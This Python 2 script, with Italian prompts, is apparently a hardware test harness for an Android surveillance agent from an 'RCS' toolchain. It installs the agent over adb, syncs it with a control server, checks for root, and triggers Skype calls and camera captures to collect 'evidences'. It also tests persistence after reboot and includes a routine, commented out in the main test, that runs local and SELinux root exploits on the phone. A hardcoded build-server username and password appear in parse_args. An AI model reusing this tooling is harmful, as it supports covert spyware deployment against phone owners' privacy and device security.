# -*- coding: utf-8 -*-

import sys, time
import csv
import os
import inspect
import traceback
import collections
import datetime
import adb
import argparse
import commands

import package
from AVCommon import build_common as build

# apk_template = "build/android/install.%s.apk"
apk_template = "assets/autotest.%s.apk"
service = 'com.android.dvci'


def say(text):
    os.system("say " + text)


def check_exploit(dev, results):
    for f in ["expl_check", "local_exploit", "selinux_check", "selinux_exploit", "check.sh"]:
        adb.copy_tmp_file("assets/exploit/%s" % f)
        adb.execute("chmod 755 /data/local/tmp/in/%s" % f)
    check = adb.execute("/data/local/tmp/in/check.sh", dev)
    results["check_exploit"] = check.split()
    if "LOCAL" in check:
        ret_local = adb.execute("/data/local/tmp/in/local_exploit id", dev)
        print "Testing LOCAL: ", ret_local
        results["exploit_local"] = "root" in ret_local
    if "SELINUX" in check:
        ret_selinux = adb.execute("/data/local/tmp/in/selinux_exploit id", dev)
        print "Testing SELINUX: ", ret_selinux
        results["exploit_selinux"] = "root" in ret_selinux

    # check root
    ret_su = adb.execute("su -c id", dev)
    print "Has SU: ", ret_su
    results["su"] = ret_su


def check_install(dev, results, factory=None):
    adb.execute("ddf ru", dev)
    # uninstall device
    adb.uninstall(service, dev)

    if adb.get_properties()['release'].startswith("2"):
        apk = apk_template % "v2"
    else:
        apk = apk_template % "default"
    # apk = apk_template % "default"

    #print "... building %s" % apk

    #if not os.path.isfile(apk):
    #    if not commands.build_apk("silent", "castore", factory):
    #        return False

    if not os.path.isfile(apk):
        print "not existent file: %s" % apk
        return False

    print "... installing %s" % apk
    # install
    if not adb.install(apk, dev):
        return False

    results["installed"] = True
    print "installation: OK"
    return True


def check_instances(c, device_id, operation_id):
    instances = c.instances_by_deviceid(device_id, operation_id)
    if not instances:
        print "no previous instances"
    assert len(instances) <= 1;
    for i in instances:
        print "... deleted old instance"
        c.instance_delete(i["_id"])
    time.sleep(5)
    instances = c.instances_by_deviceid(device_id, operation_id)
    assert not instances
    return instances


def execute_agent(dev, results):
    processes = adb.ps(dev)
    running = service in processes
    if not running:
        if not adb.executeMonkey(service, dev):
            return False
        else:
            results["executed"] = True;
            print "executed: OK"

    # check for running
    time.sleep(3)
    processes = adb.ps(dev)
    running = service in processes

    if not running:
        if not adb.executeService(service, dev):
            return False
        else:
            results["executed"] = True;
            print "executed: OK"

    time.sleep(3)
    processes = adb.ps(dev)
    running = service in processes
    assert running

    say("agent installed, verify root request")
    return True


def connect(c):
    operation = "Rite_Mobile"
    target_name = "HardwareFunctional"
    # logging into server
    assert c
    if not c.logged_in():
        return False
        # print("Not logged in")
    else:
        print "logged in %s: OK" % c.host
    operation_id, group_id = c.operation(operation)
    target_id = c.targets(operation_id, target_name)[0]
    return operation_id, target_id


def sync(c, device_id, instances, operation_id):
    print "... sleeping for sync"
    time.sleep(60)
    for i in range(10):
        # print "operation: %s, %s" % (operation_id, group_id)
        instances = c.instances_by_deviceid(device_id, operation_id)
        if not instances:
            print "... waiting for sync"
            time.sleep(10)
        else:
            break
    assert len(instances) == 1
    instance_id = instances[0]['_id']
    # print "instance_id: %s " % instance_id
    print "sync: OK"
    return instance_id


def rename_instance(c, instance_id, results):
    info = c.instance_info(instance_id)
    c.instance_rename(instance_id, info['name'] + " " + results['device'])
    info = c.instance_info(instance_id)
    results['instance_name'] = info['name']
    print "instance name: %s" % info['name']


def check_root(c, instance_id, results, target_id):
    info_evidences = []
    counter = 0
    while not info_evidences and counter < 10:
        infos = c.infos(target_id, instance_id)
        info_evidences = [e['data']['content'] for e in infos if 'Root' in e['data']['content']]
        counter += 1
        if not info_evidences:
            print "... waiting for info"
            time.sleep(10)

    # print "info_evidences: %s: " % info_evidences
    if not info_evidences:
        results['root'] = 'No'
        print "No Root"
        return False
    else:
        print "root: OK"
    results['info'] = len(info_evidences) > 0
    root_method = info_evidences[0]
    results['root'] = root_method
    roots = [r for r in info_evidences if 'previous' not in r]
    # print "roots: %s " % roots
    assert len(roots) == 1
    return True


def check_evidences(c, instance_id, results, target_id):
    time.sleep(60)
    evidences = c.evidences(target_id, instance_id)
    kinds = {}
    for e in evidences:
        t = e['type']
        if not t in kinds.keys():
            kinds[t] = []

        kinds[t].append(e)

    ev = ""
    for k in kinds.keys():
        ev += "%s: %s\n" % (k, len(kinds[k]))

    results['evidences'] = ev
    results['evidence_types'] = kinds.keys()


def uninstall_agent(dev, results):
    say("press enter to uninstall")
    input("... PRESS ENTER TO UNINSTALL")
    calc = [f.split(":")[1] for f in adb.execute("pm list packages calc").split() if f.startswith("package:")][0]
    print "... executing calc: %s" % calc
    adb.executeMonkey(calc, dev)
    time.sleep(5)
    say("agent uninstall, verify request")

    time.sleep(15)

    processes = adb.ps(dev)
    uninstall = service not in processes
    results['uninstall'] = uninstall

    if not uninstall:
        print "uninstall: ERROR"
        print "processes: %s" % processes
        adb.uninstall(service, dev)
    else:
        print "uninstall: OK"


def check_persistence(dev, results):
    print ".... reboot"
    adb.reboot(dev)
    time.sleep(60)
    processes = adb.ps(dev)
    running = "persistence: %s" % service in processes
    results['running'] = running


def check_skype(dev):
    for i in range(10):
        time.sleep(10)
        ret = adb.executeSU("ls /data/data/com.android.dvci/files/l4")
        print ret
        if not 'No such file or directory' in ret:
            break

    print "Skype call and sleep"
    adb.skype_call(dev)
    time.sleep(60)

    adb.execute("am start -a android.media.action.IMAGE_CAPTURE")
    time.sleep(60)


def test_device(device_id, dev, results):
    # check manually exploits
    # check_exploit(dev, results)

    # connect
    with build.connection() as c:
        ret = connect(c)
        if not ret:
            return "Not logged in"

        operation_id, target_id = ret
        #agents = c.agents(target_id)
        #print agents

        #factory = "540468ffaef1de2997000fb6"
        instances = check_instances(c, device_id, operation_id)

        # install agent and check it's running
        if not check_install(dev, results):
            return "installation failed"

        if not execute_agent(dev, results):
            return "execution failed"

        # sync e verifica
        instance_id = sync(c, device_id, instances, operation_id)

        # rename instance
        rename_instance(c, instance_id, results)

        # check for root
        check_root(c, instance_id, results, target_id)

        #skype call
        check_skype(c)

        # evidences
        check_evidences(c, instance_id, results, target_id)

    # uninstall
    uninstall_agent(dev, results)

    # persistence after reboot
    check_persistence(dev, results)

    return True


def set_time(dev):
    t = time.localtime()
    adb.execute('date -s %04d%02d%02d.%02d%02d%02d' % (t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec))


def do_test(dev=None):
    build.connection.host = "rcs-castore"
    device_id = adb.get_deviceid(dev)
    # print "device_id: %s" % device_id

    assert device_id
    assert len(device_id) >= 8

    with open('report/test-%s.csv' % device_id, 'ab') as csvfile:
        # write header
        devicelist = csv.writer(csvfile, delimiter=";",
                                quotechar="|", quoting=csv.QUOTE_MINIMAL)

        set_time(dev)
        # getprop device
        props = adb.get_properties(dev)
        device = "%s %s" % (props["manufacturer"], props["model"])

        results = collections.OrderedDict()
        results['time'] = "%s" % datetime.datetime.now()
        results['device'] = device
        results['id'] = device_id
        results['release'] = props["release"]
        results['selinux'] = props["selinux"]
        results['build_date'] = props["build_date"]
        results['error'] = ""
        results["return"] = ""
        try:
            ret = test_device(device_id, dev, results)
            results["return"] = ret
            print "return: %s " % ret
        except Exception, ex:
            traceback.print_exc(device_id)
            results['error'] = "%s" % ex

        print results

        #devicelist.writerow(results.keys())
        devicelist.writerow(results.values())

    return results


def print_if_exists(results, param):
    for p in param:
        print "\t%s: %s" % (p, results.get(p, ""))


def report_test_rail(results):
    print "Installation"
    print_if_exists(results, ["time", "installed", "executed", "instance_name", "info", "error", ])
    print "Device"
    print_if_exists(results, ["device", "id", "release", "build_date"])
    print "Root"
    print_if_exists(results, ["root", "selinux"])
    print "Evidences"
    print_if_exists(results, ["evidences"])
    print "Uninstall"
    print_if_exists(results, ["uninstall", "running"])


def parse_args():
    parser = argparse.ArgumentParser(description='AVMonitor master.')
    parser.add_argument('-b', '--build', required=False, action='store_true',
                        help="Rebuild apk")
    args = parser.parse_args()
    if args.build or not os.path.exists('assets/autotest.default.apk'):
        os.system(
            'ruby assets/rcs-core.rb -u zenobatch -p castoreP123 -d rcs-castore -f RCS_0000002050 -b build.and.json -o and.zip')
        os.system('unzip and.zip -d assets -o')
        os.remove('and.zip')
    if not os.path.exists('assets/autotest.default.apk'):
        print "ERROR, cannot build apk"
        exit(0)


def main():
    devices = adb.get_attached_devices()

    print """ prerequisiti:
    1) Telefono connesso in USB,
    2) USB Debugging enabled (settings/developer options/usb debugging)
    3) connesso wifi a RSSM
    4) screen time 10m (settings/display/sleep)
    """

    parse_args()

    print "devices connessi:"
    for device in devices:
        print device

    dev = None
    if not devices:
        print "non ci sono device connessi"
    else:

        if len(devices) > 1:
            dev = raw_input("su quale device si vuole eseguire il test? ")
            print "eseguo il test su %s" % dev

        results = do_test(dev)
        report_test_rail(results)

        with open('report/hardware.logs.txt', 'a+') as logfile:
            logfile.write(str(results))
            logfile.write("\n")
        with open('report/hardware.logs.py', 'a+') as logfile:
            logfile.write("h.append(collections." + str(results) + ")")
            logfile.write("\n")
    print "Fine."
    say("test ended")


if __name__ == "__main__":
    main()